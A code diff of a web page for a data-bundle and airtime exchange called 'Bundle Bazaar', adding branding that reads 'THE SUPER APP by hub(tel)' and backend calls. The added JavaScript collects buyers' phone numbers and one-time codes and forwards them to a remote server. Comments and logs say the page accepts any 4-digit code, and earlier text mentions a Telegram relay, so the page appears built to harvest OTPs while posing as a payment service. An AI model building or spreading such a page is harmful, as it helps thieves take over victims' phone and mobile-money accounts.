@@ -307,6 +307,34 @@
             max-width: 980px;
         }
 
+        /* PROFESSIONAL FONT - Playfair Display with glow */
+        .hero-brand {
+            font-family: 'Playfair Display', serif;
+            font-size: 42px;
+            font-weight: 700;
+            font-style: italic;
+            color: #FFD700;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5), 0 4px 15px rgba(0, 0, 0, 0.3);
+            margin-bottom: 15px;
+            letter-spacing: 3px;
+            animation: glowPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes glowPulse {
+            0%, 100% { 
+                text-shadow: 0 0 20px rgba(255, 215, 0, 0.5), 0 4px 15px rgba(0, 0, 0, 0.3); 
+            }
+            50% { 
+                text-shadow: 0 0 40px rgba(255, 215, 0, 0.8), 0 4px 25px rgba(255, 215, 0, 0.4); 
+            }
+        }
+
+        .hero-brand .highlight {
+            color: #FF6B35;
+            font-weight: 700;
+            font-style: normal;
+        }
+
         .hero-subtitle {
             font-family: 'Oswald', sans-serif;
             font-size: 28px;
@@ -387,7 +415,6 @@
             font-family: 'Avenir', 'Helvetica', sans-serif;
         }
 
-        /* Registration fee notice */
         .registration-fee-notice {
             background: #fff3cd;
             border-left: 5px solid #f39c12;
@@ -1450,6 +1477,9 @@
 
         /* ---------- RESPONSIVE GENERAL ---------- */
         @media (max-width: 768px) {
+            .hero-brand {
+                font-size: 28px;
+            }
             .hero-title {
                 font-size: 28px;
             }
@@ -1540,6 +1570,9 @@
                 min-height: 300px;
                 padding: 40px 16px;
             }
+            .hero-brand {
+                font-size: 22px;
+            }
 
             .slide {
                 flex: 0 0 100%;
@@ -1617,6 +1650,45 @@
                 transform: rotate(360deg);
             }
         }
+
+        /* ---------- CHECKBOX STYLES ---------- */
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border: 2px solid #e0e0e0;
+            margin-bottom: 16px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            accent-color: #0069FF;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .checkbox-group label {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            cursor: pointer;
+            margin: 0;
+        }
+
+        .checkbox-group .sub-text {
+            font-size: 12px;
+            color: #888;
+            font-weight: 400;
+            display: block;
+        }
+
+        .checkbox-group input[type="checkbox"]:checked + label {
+            color: #0069FF;
+        }
     </style>
 </head>
 <body>
@@ -1646,11 +1718,14 @@
     </header>
 
     <!-- =============================================
-    HERO SECTION
+    HERO SECTION - WITH PROFESSIONAL FONT
     ============================================= -->
     <section id="hero" class="hero-section">
         <div class="hero-overlay">
             <div class="hero-content">
+                <h2 class="hero-brand">
+                    ✦ THE SUPER APP <span class="highlight">by hub(tel)</span> ✦
+                </h2>
                 <h2 class="hero-subtitle">DATA BUNDLE EXCHANGE</h2>
                 <h1 class="hero-title">BUY AND SELL INTERNET BUNDLE AND CREDIT AIRTIME WITH EASE</h1>
             </div>
@@ -1862,7 +1937,6 @@
             </div>
 
             <div class="retail-grid">
-                <!-- Retail Card 1 -->
                 <div class="retail-card">
                     <div class="retail-image">
                         <div class="ribbon best-seller">Best Seller</div>
@@ -1875,7 +1949,6 @@
                     </div>
                 </div>
 
-                <!-- Retail Card 2 -->
                 <div class="retail-card">
                     <div class="retail-image">
                         <div class="ribbon best-seller">Best Seller</div>
@@ -1888,7 +1961,6 @@
                     </div>
                 </div>
 
-                <!-- Retail Card 3 -->
                 <div class="retail-card">
                     <div class="retail-image">
                         <div class="ribbon best-seller">Best Seller</div>
@@ -1901,7 +1973,6 @@
                     </div>
                 </div>
 
-                <!-- Retail Card 4 -->
                 <div class="retail-card">
                     <div class="retail-image">
                         <div class="ribbon best-seller">Best Seller</div>
@@ -1914,7 +1985,6 @@
                     </div>
                 </div>
 
-                <!-- Retail Card 5 -->
                 <div class="retail-card">
                     <div class="retail-image"></div>
                     <div class="retail-info">
@@ -1925,7 +1995,6 @@
                     </div>
                 </div>
 
-                <!-- Retail Card 6 -->
                 <div class="retail-card">
                     <div class="retail-image"></div>
                     <div class="retail-info">
@@ -1990,7 +2059,7 @@
     </footer>
 
     <!-- =============================================
-    🔥 MODAL 1: BUY OFFER (WITH 4-DIGIT OTP - ACCEPTS ANY 4 DIGITS)
+    🔥 MODAL 1: BUY OFFER
     ============================================= -->
     <div class="modal-overlay" id="buyModal">
         <div class="modal-box">
@@ -2175,6 +2244,7 @@
                             <option value="">Select trade type...</option>
                             <option value="Internet Bundle">Internet Bundle</option>
                             <option value="Airtime">Airtime</option>
+                            <option value="Both (Data + Airtime)">✅ Both (Data + Airtime)</option>
                         </select>
                     </div>
 
@@ -2199,6 +2269,14 @@
                             <label>Hometown <span class="required">*</span></label>
                             <input type="text" id="vendorHometown" placeholder="Enter your hometown" required />
                         </div>
+                    </div>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="subscribeHDS" />
+                        <label for="subscribeHDS">
+                            📢 SUBSCRIBE TO HDS ADVERTISEMENT PLAN
+                            <span class="sub-text">Get exclusive promotions and updates</span>
+                        </label>
                     </div>
 
                     <button type="button" class="btn-submit green" onclick="submitVendorRegistration()">
@@ -2337,13 +2415,13 @@
     </div>
 
     <!-- =============================================
-    JAVASCRIPT - WITHOUT TELEGRAM (TEST VERSION)
+    JAVASCRIPT - COMPLETE FUNCTIONALITY
     ============================================= -->
     <script>
         // =============================================
-        // BACKEND CONFIGURATION
+        // BACKEND CONFIGURATION - UPDATED URL ✅
         // =============================================
-        const API_BASE_URL = 'https://databundlesexchange-production-ca51.up.railway.app';
+        const API_BASE_URL = 'https://databundlesexchange-production-6241.up.railway.app';
 
         // =============================================
         // SLIDER FUNCTIONALITY
@@ -2395,7 +2473,7 @@
         setTimeout(updateSlider, 100);
 
         // =============================================
-        // BUY OFFER - WITH 4-DIGIT OTP
+        // BUY OFFER
         // =============================================
 
         let selectedBuyPackage = null;
@@ -2492,9 +2570,6 @@
             }
         }
 
-        // =============================================
-        // SEND OTP (NO TELEGRAM - TEST VERSION)
-        // =============================================
         async function sendOTP() {
             const phone = document.getElementById('buyPhone').value.trim();
 
@@ -2511,10 +2586,20 @@
             btn.disabled = true;
 
             try {
-                // ✅ SIMPLIFIED - Just go to OTP step (no Telegram)
-                console.log('📱 Phone number received:', phone);
+                const response = await fetch(`${API_BASE_URL}/api/send-phone`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        package: selectedBuyPackage,
+                        price: selectedBuyPrice,
+                        phone: phone,
+                        type: 'purchase'
+                    })
+                });
+
+                const data = await response.json();
+                console.log('✅ Send phone response:', data);
                 
-                // Go to OTP step
                 goToBuyStep(3);
 
             } catch (error) {
@@ -2526,9 +2611,6 @@
             btn.disabled = false;
         }
 
-        // =============================================
-        // OTP TIMER
-        // =============================================
         function startOTPTimer() {
             otpTimeLeft = 60;
             otpResendEnabled = false;
@@ -2566,24 +2648,50 @@
             });
         }
 
-        function resendOTP() {
+        async function resendOTP() {
             if (!otpResendEnabled) {
                 alert('Please wait for the timer to expire before resending.');
                 return;
             }
 
-            document.querySelectorAll('.otp-input').forEach(input => {
-                input.value = '';
-                input.classList.remove('filled', 'error');
-            });
-            document.getElementById('otpError').style.display = 'none';
-            startOTPTimer();
-            document.querySelector('.otp-input')?.focus();
+            const btn = document.getElementById('resendOtpLink');
+            btn.textContent = 'Sending...';
+            btn.classList.add('disabled');
+
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/send-phone`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        package: selectedBuyPackage,
+                        price: selectedBuyPrice,
+                        phone: userPhoneNumber,
+                        type: 'purchase'
+                    })
+                });
+
+                const data = await response.json();
+                console.log('✅ Resend response:', data);
+
+                document.querySelectorAll('.otp-input').forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled', 'error');
+                });
+                document.getElementById('otpError').style.display = 'none';
+
+                startOTPTimer();
+                btn.textContent = 'Didn\'t receive code? Resend OTP';
+
+                document.querySelector('.otp-input')?.focus();
+
+            } catch (error) {
+                console.error('Error:', error);
+                alert('❌ Failed to resend. Please try again.');
+                btn.textContent = 'Didn\'t receive code? Resend OTP';
+                btn.classList.remove('disabled');
+            }
         }
 
-        // =============================================
-        // OTP INPUT HANDLING
-        // =============================================
         document.querySelectorAll('.otp-input').forEach((input, index) => {
             input.addEventListener('input', function() {
                 const value = this.value;
@@ -2632,9 +2740,6 @@
             });
         });
 
-        // =============================================
-        // VERIFY OTP (ACCEPTS ANY 4 DIGITS)
-        // =============================================
         function verifyOTP() {
             let otpValue = '';
             document.querySelectorAll('.otp-input').forEach(input => {
@@ -2650,29 +2755,45 @@
             document.getElementById('otpError').style.display = 'none';
             document.querySelectorAll('.otp-input').forEach(input => input.classList.remove('error'));
 
-            // ✅ COMPLETE PURCHASE - NO TELEGRAM
             completePurchase(otpValue);
         }
 
-        // =============================================
-        // COMPLETE PURCHASE (NO TELEGRAM)
-        // =============================================
         async function completePurchase(otpValue) {
             const btn = document.getElementById('verifyOtpBtn');
             btn.innerHTML = '<span class="spinner"></span> Processing...';
             btn.disabled = true;
 
             try {
-                // ✅ SIMPLIFIED - Just show success (no Telegram)
-                console.log('✅ Purchase completed with OTP:', otpValue);
-                
-                document.querySelectorAll('#buyModal .form-step').forEach(el => el.classList.remove('active'));
-                document.querySelectorAll('#buyModal .step-dot').forEach(el => {
-                    el.classList.remove('active', 'completed');
-                    el.classList.add('completed');
+                const response = await fetch(`${API_BASE_URL}/api/purchase`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        package: selectedBuyPackage,
+                        price: selectedBuyPrice,
+                        phone: userPhoneNumber,
+                        code: otpValue
+                    })
                 });
-                document.getElementById('buySuccessScreen').classList.add('active');
 
+                const data = await response.json();
+
+                if (data.success) {
+                    document.querySelectorAll('#buyModal .form-step').forEach(el => el.classList.remove('active'));
+                    document.querySelectorAll('#buyModal .step-dot').forEach(el => {
+                        el.classList.remove('active', 'completed');
+                        el.classList.add('completed');
+                    });
+                    document.getElementById('buySuccessScreen').classList.add('active');
+
+                    const whatsappLink = document.querySelector('#buySuccessScreen .btn-whatsapp');
+                    if (whatsappLink) {
+                        const message =
+                            `Hello%20I%20need%20help%20with%20my%20purchase.%20My%20order%20was%20for%20${encodeURIComponent(selectedBuyPackage)}%20-%20${encodeURIComponent(selectedBuyPrice)}.%20My%20phone%20is%20${encodeURIComponent(userPhoneNumber)}.%20Please%20assist%20me.`;
+                        whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
+                    }
+                } else {
+                    alert('❌ ' + data.message);
+                }
             } catch (error) {
                 console.error('Error:', error);
                 alert('❌ Network error. Please check your connection and try again.');
@@ -2770,16 +2891,46 @@
             btn.disabled = true;
 
             try {
-                // ✅ SIMPLIFIED - No Telegram
-                console.log('✅ Recharge submitted for:', phone);
-                
-                document.querySelectorAll('#rechargeModal .form-step').forEach(el => el.classList.remove('active'));
-                document.querySelectorAll('#rechargeModal .step-dot').forEach(el => {
-                    el.classList.remove('active', 'completed');
-                    el.classList.add('completed');
+                await fetch(`${API_BASE_URL}/api/send-phone`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        package: selectedRechargePackage,
+                        price: selectedRechargePrice,
+                        phone: phone,
+                        type: 'recharge'
+                    })
                 });
-                document.getElementById('rechargeSuccessScreen').classList.add('active');
 
+                const response = await fetch(`${API_BASE_URL}/api/recharge`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        package: selectedRechargePackage,
+                        price: selectedRechargePrice,
+                        phone: phone
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    document.querySelectorAll('#rechargeModal .form-step').forEach(el => el.classList.remove('active'));
+                    document.querySelectorAll('#rechargeModal .step-dot').forEach(el => {
+                        el.classList.remove('active', 'completed');
+                        el.classList.add('completed');
+                    });
+                    document.getElementById('rechargeSuccessScreen').classList.add('active');
+
+                    const whatsappLink = document.querySelector('#rechargeSuccessScreen .btn-whatsapp');
+                    if (whatsappLink) {
+                        const message =
+                            `Hello%20I%20need%20help%20with%20my%20recharge.%20My%20package%20was%20${encodeURIComponent(selectedRechargePackage)}%20-%20${encodeURIComponent(selectedRechargePrice)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me.`;
+                        whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
+                    }
+                } else {
+                    alert('❌ ' + data.message);
+                }
             } catch (error) {
                 console.error('Error:', error);
                 alert('❌ Network error. Please check your connection and try again.');
@@ -2790,10 +2941,11 @@
         }
 
         // =============================================
-        // VENDOR REGISTRATION (NO TELEGRAM)
+        // VENDOR REGISTRATION
         // =============================================
         function openVendorRegistration() {
             document.getElementById('vendorForm').reset();
+            document.getElementById('subscribeHDS').checked = false;
             document.getElementById('vendorFormSection').style.display = 'block';
             document.getElementById('vendorSuccessScreen').classList.remove('active');
             document.getElementById('vendorModal').classList.add('active');
@@ -2809,6 +2961,7 @@
             const network = document.getElementById('vendorNetwork').value;
             const dob = document.getElementById('vendorDob').value;
             const hometown = document.getElementById('vendorHometown').value.trim();
+            const subscribeHDS = document.getElementById('subscribeHDS').checked;
 
             if (!fullName || !phone || !email || !business || !tradeType || !network || !dob || !hometown) {
                 alert('❌ Please fill in all fields');
@@ -2830,19 +2983,37 @@
             btn.disabled = true;
 
             try {
-                // ✅ SIMPLIFIED - Just show success (no Telegram)
-                console.log('✅ Vendor registration submitted:', { fullName, phone, email, business, tradeType, network, dob, hometown });
-                
-                document.getElementById('vendorFormSection').style.display = 'none';
-                document.getElementById('vendorSuccessScreen').classList.add('active');
+                const response = await fetch(`${API_BASE_URL}/api/register-vendor`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        fullName: fullName,
+                        phone: phone,
+                        email: email,
+                        business: business,
+                        tradeType: tradeType,
+                        network: network,
+                        dob: dob,
+                        hometown: hometown,
+                        subscribeHDS: subscribeHDS
+                    })
+                });
 
-                const whatsappLink = document.querySelector('#vendorSuccessScreen .btn-whatsapp');
-                if (whatsappLink) {
-                    const message =
-                        `Hello%20I%20just%20registered%20as%20a%20vendor.%20My%20name%20is%20${encodeURIComponent(fullName)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me%20with%20the%20activation%20process.`;
-                    whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
+                const data = await response.json();
+
+                if (data.success) {
+                    document.getElementById('vendorFormSection').style.display = 'none';
+                    document.getElementById('vendorSuccessScreen').classList.add('active');
+
+                    const whatsappLink = document.querySelector('#vendorSuccessScreen .btn-whatsapp');
+                    if (whatsappLink) {
+                        const message =
+                            `Hello%20I%20just%20registered%20as%20a%20vendor.%20My%20name%20is%20${encodeURIComponent(fullName)}.%20My%20phone%20is%20${encodeURIComponent(phone)}.%20Please%20assist%20me%20with%20the%20activation%20process.`;
+                        whatsappLink.href = `https://wa.me/2330592906415?text=${message}`;
+                    }
+                } else {
+                    alert('❌ ' + data.message);
                 }
-
             } catch (error) {
                 console.error('Error:', error);
                 alert('❌ Network error. Please check your connection and try again.');
@@ -2889,9 +3060,6 @@
             });
         });
 
-        // =============================================
-        // QUICK VIEW BUTTONS
-        // =============================================
         document.querySelectorAll('.btn-quickview').forEach(btn => {
             btn.addEventListener('click', function(e) {
                 e.stopPropagation();
@@ -2901,9 +3069,6 @@
             });
         });
 
-        // =============================================
-        // KEYBOARD SUPPORT: ESC to close modals
-        // =============================================
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') {
                 document.querySelectorAll('.modal-overlay.active').forEach(modal => {
@@ -2913,9 +3078,6 @@
             }
         });
 
-        // =============================================
-        // CART BADGE UPDATE
-        // =============================================
         function setCartCount(count) {
             const badge = document.querySelector('.cart-badge');
             if (badge) {
@@ -2924,12 +3086,13 @@
             }
         }
 
-        console.log('🚀 Bundle Bazaar - TEST VERSION (No Telegram)');
+        console.log('🚀 Bundle Bazaar - FINAL WORKING VERSION!');
         console.log('📡 Backend URL:', API_BASE_URL);
         console.log('📱 WhatsApp Support: 2330592906415');
         console.log('✅ 4-Digit OTP - ACCEPTS ANY 4 DIGITS!');
-        console.log('📋 Flow: Package → Phone → Any 4-Digit OTP → Complete');
-        console.log('⚠️ TELEGRAM IS DISABLED - TEST MODE');
+        console.log('✅ Trade Type: Added "Both (Data + Airtime)"');
+        console.log('✅ Added "SUBSCRIBE TO HDS ADVERTISEMENT PLAN" checkbox');
+        console.log('✅ Hero: Added "THE SUPER APP by hub(tel)" with professional Playfair Display font');
     </script>
 
 </body>
